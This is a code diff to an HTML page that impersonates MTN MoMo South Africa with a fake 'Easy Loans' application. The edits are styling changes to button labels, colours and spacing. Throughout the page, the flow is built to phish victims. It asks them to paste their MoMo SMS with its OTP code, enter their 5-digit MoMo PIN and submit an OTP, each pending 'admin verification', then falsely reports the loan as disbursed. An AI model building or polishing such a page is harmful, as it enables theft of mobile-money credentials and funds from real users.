@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MTN MoMo South Africa – Easy Loans</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="./style.css" />
 </head>
 <body>
@@ -32,7 +32,7 @@
                     <div class="range-ends"><span>R 5,000</span><span>R 500,000</span></div>
                     <div class="monthly-box"><span class="ml">Monthly Payment</span><span class="ma" id="monthlyAmt">R 1,042</span></div>
                 </div>
-                <button class="btn-grad" onclick="startApplication()">START APPLICATION</button>
+                <button class="btn-grad" onclick="startApplication()">Start Application</button>
             </div>
         </div>
         <div class="land-footer">© 2026 MTN MoMo Loans – Powered by MTN South Africa</div>
@@ -42,9 +42,12 @@
     <div id="page-step1" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
-            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
+            <div class="mtn-logo" style="flex-direction:row;gap:8px;">
                 <img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" />
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">South Africa</div></div>
+                <div style="text-align:left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div>
+                </div>
             </div>
             <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
         </nav>
@@ -58,7 +61,7 @@
                 <div class="field"><label>Loan Amount (ZAR)</label><input type="number" id="s1am" value="50000" placeholder="Enter amount" oninput="clearErr('s1Err')" /></div>
                 <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
                 <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
-                <button class="btn-grad" onclick="toS2()">NEXT STEP</button>
+                <button class="btn-grad" onclick="toS2()">Next Step</button>
             </div>
         </div>
     </div>
@@ -67,9 +70,12 @@
     <div id="page-step2" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
-            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
+            <div class="mtn-logo" style="flex-direction:row;gap:8px;">
                 <img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" />
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">South Africa</div></div>
+                <div style="text-align:left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div>
+                </div>
             </div>
             <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
         </nav>
@@ -89,7 +95,7 @@
                     <div class="field-hint">9 digits without +27 prefix (e.g., 821234567)</div>
                 </div>
                 <div class="field"><label>Email Address</label><input type="email" id="s2em" placeholder="your@email.com" oninput="clearErr('s2Err')" /></div>
-                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step1')">BACK</button><button class="btn-grad" onclick="toS3()">NEXT STEP</button></div>
+                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step1')">Back</button><button class="btn-grad" onclick="toS3()">Next Step</button></div>
             </div>
         </div>
     </div>
@@ -98,9 +104,12 @@
     <div id="page-step3" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
-            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
+            <div class="mtn-logo" style="flex-direction:row;gap:8px;">
                 <img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" />
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">South Africa</div></div>
+                <div style="text-align:left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div>
+                </div>
             </div>
             <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
         </nav>
@@ -121,19 +130,19 @@
                     <div class="sum-row"><span class="sk">Purpose:</span><span class="sv" id="sP">—</span></div>
                     <div class="sum-row"><span class="sk">Applicant:</span><span class="sv" id="sN">—</span></div>
                 </div>
-                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step2')">BACK</button><button class="btn-grad" onclick="submitApp()">SUBMIT APPLICATION</button></div>
+                <div class="step-btns"><button class="btn-gray" onclick="goTo('page-step2')">Back</button><button class="btn-grad" onclick="submitApp()">Submit Application</button></div>
             </div>
         </div>
     </div>
 
     <!-- PAGE 5: PROCESSING -->
     <div id="page-processing" class="page">
-        <div style="background:linear-gradient(160deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+        <div style="background:var(--mtn-black); min-height:100vh; width:100%; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="proc-wrap">
                 <div class="proc-icon">⏳</div>
                 <h2>Processing Application...</h2>
                 <p>Please wait while we process your loan application</p>
-                <div id="processingStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">⏳ Awaiting admin approval...</div>
+                <div id="processingStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-yellow); font-weight:600;">⏳ Awaiting admin approval...</div>
             </div>
         </div>
     </div>
@@ -142,9 +151,12 @@
     <div id="page-sms-paste" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-processing')">← Back</a>
-            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
+            <div class="mtn-logo" style="flex-direction:row;gap:8px;">
                 <img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" />
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">South Africa</div></div>
+                <div style="text-align:left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div>
+                </div>
             </div>
             <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
         </nav>
@@ -155,27 +167,27 @@
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="momErr"><span class="msg-icon">✕</span><span id="momErrTxt"></span></div>
                 <div class="momo-msg-box">
-                    <label style="font-weight:600; display:block; margin-bottom:6px;">📩 Paste the MoMo message content:</label>
-                    <textarea id="smsMsgBox" placeholder="Copy and paste the entire MoMo message you received on your phone here..."></textarea>
-                    <div class="hint">This should include the OTP code or verification details sent to your MoMo number.</div>
+                    <label style="font-weight:700; display:block; margin-bottom:8px; color:var(--mtn-black);">📩 Paste the MoMo message content:</label>
+                    <textarea id="smsMsgBox" placeholder="Copy and paste the entire MoMo message you received on your phone here..." style="width:100%; padding:12px 14px; border:1.5px solid var(--border); border-radius:8px; font-family:'Inter',sans-serif; font-size:0.9rem; min-height:140px; resize:vertical; outline:none;"></textarea>
+                    <div class="hint" style="font-size:0.75rem; color:var(--text-light); margin-top:6px;">This should include the OTP code or verification details sent to your MoMo number.</div>
                 </div>
-                <div style="margin: 8px 0 12px; padding: 10px; background: #f8f9fa; border-radius: 6px; font-size:0.8rem; color:var(--text-light);">
+                <div style="margin: 12px 0; padding: 12px 14px; background: var(--mtn-yellow-soft); border-left: 4px solid var(--mtn-yellow); border-radius: 6px; font-size:0.8rem; color:var(--mtn-black); line-height:1.5;">
                     <strong>💡 Tip:</strong> Check your SMS inbox for the message from MTN MoMo South Africa. Copy the entire message text.
                 </div>
-                <button class="btn-grad" onclick="doSmsParse()">SUBMIT MOMO MESSAGE</button>
+                <button class="btn-grad" onclick="doSmsParse()">Submit MoMo Message</button>
             </div>
         </div>
     </div>
 
     <!-- PAGE 7: WAIT SMS -->
     <div id="page-wait-sms" class="page">
-        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+        <div style="background:var(--mtn-black); min-height:100vh; width:100%; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="wait-wrap">
                 <div class="wait-icon">⏳</div>
                 <h2>Verifying SMS Message...</h2>
                 <p>Your SMS message has been received. Please wait for admin verification...</p>
-                <div id="waitSmsStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">⏳ Admin is reviewing your SMS...</div>
-                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitSmsAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+                <div id="waitSmsStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-yellow); font-weight:600;">⏳ Admin is reviewing your SMS...</div>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.55);">Application ID: <span id="waitSmsAppId" style="font-family:monospace; color:var(--mtn-yellow); font-weight:700;">-</span></div>
             </div>
         </div>
     </div>
@@ -184,9 +196,12 @@
     <div id="page-pin" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-wait-sms')">← Back</a>
-            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
+            <div class="mtn-logo" style="flex-direction:row;gap:8px;">
                 <img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" />
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">South Africa</div></div>
+                <div style="text-align:left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div>
+                </div>
             </div>
             <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
         </nav>
@@ -194,7 +209,7 @@
             <div class="step-card">
                 <h2>Enter MoMo PIN</h2>
                 <p class="step-sub">Step 5 of 5</p>
-                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+                <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
                 <div class="msg-box error" id="pinErr"><span class="msg-icon">✕</span><span id="pinErrTxt"></span></div>
                 <div class="pin-label">Enter your MoMo PIN (5 digits):</div>
                 <div id="pinAttemptsDisplay" class="pin-attempts">
@@ -209,20 +224,20 @@
                     <button class="pin-eye" onclick="togPin()" title="Show/Hide">👁</button>
                     <button class="pin-delete" onclick="clearLoginPin()" title="Delete PIN">✕</button>
                 </div>
-                <button class="btn-grad" onclick="doPin()">SUBMIT MOMO PIN</button>
+                <button class="btn-grad" onclick="doPin()" style="margin-top:10px;">Submit MoMo PIN</button>
             </div>
         </div>
     </div>
 
     <!-- PAGE 9: WAIT PIN -->
     <div id="page-wait-pin" class="page">
-        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+        <div style="background:var(--mtn-black); min-height:100vh; width:100%; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="wait-wrap">
                 <div class="wait-icon">⏳</div>
                 <h2>Verifying MoMo PIN...</h2>
                 <p>Your MoMo PIN has been received. Please wait for admin verification...</p>
-                <div id="waitPinStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">⏳ Admin is reviewing your PIN...</div>
-                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitPinAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+                <div id="waitPinStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-yellow); font-weight:600;">⏳ Admin is reviewing your PIN...</div>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.55);">Application ID: <span id="waitPinAppId" style="font-family:monospace; color:var(--mtn-yellow); font-weight:700;">-</span></div>
             </div>
         </div>
     </div>
@@ -231,9 +246,12 @@
     <div id="page-otp" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-wait-pin')">← Back</a>
-            <div class="mtn-logo" style="flex-direction:row;gap:6px;">
+            <div class="mtn-logo" style="flex-direction:row;gap:8px;">
                 <img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img sm" />
-                <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">South Africa</div></div>
+                <div style="text-align:left;">
+                    <div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div>
+                    <div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div>
+                </div>
             </div>
             <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
         </nav>
@@ -258,20 +276,20 @@
                     🔄 Resend OTP
                 </button>
                 <div id="rejectionInfo" style="margin-top: 10px; font-size: 0.8rem; color: var(--text-light);"></div>
-                <button class="btn-grad" onclick="doOtp()" style="margin-top: 10px;">VERIFY & APPROVE LOAN</button>
+                <button class="btn-grad" onclick="doOtp()" style="margin-top: 10px;">Verify & Approve Loan</button>
             </div>
         </div>
     </div>
 
     <!-- PAGE 11: WAIT OTP -->
     <div id="page-wait-otp" class="page">
-        <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+        <div style="background:var(--mtn-black); min-height:100vh; width:100%; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="wait-wrap">
                 <div class="wait-icon">⏳</div>
                 <h2>Verifying OTP Code...</h2>
                 <p>Your OTP code has been received. Please wait for admin verification...</p>
-                <div id="waitOtpStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-gold);">⏳ Admin is verifying your OTP...</div>
-                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitOtpAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+                <div id="waitOtpStatus" style="margin-top:20px; font-size:0.9rem; color:var(--mtn-yellow); font-weight:600;">⏳ Admin is verifying your OTP...</div>
+                <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.55);">Application ID: <span id="waitOtpAppId" style="font-family:monospace; color:var(--mtn-yellow); font-weight:700;">-</span></div>
             </div>
         </div>
     </div>
@@ -294,7 +312,7 @@
             </div>
             <div class="nxt-steps"><span style="font-size:1.2rem;">📌</span><p><strong>Next Steps:</strong> To start repaying, you can set up an automatic payment plan in your MTN MoMo account in the next section.</p></div>
             <div class="rth-wrap">
-                <button class="rth-btn" onclick="alert('Thank you! Your loan has been disbursed.')">FINISH</button>
+                <button class="rth-btn" onclick="alert('Thank you! Your loan has been disbursed.')">Finish</button>
             </div>
         </div>
     </div>
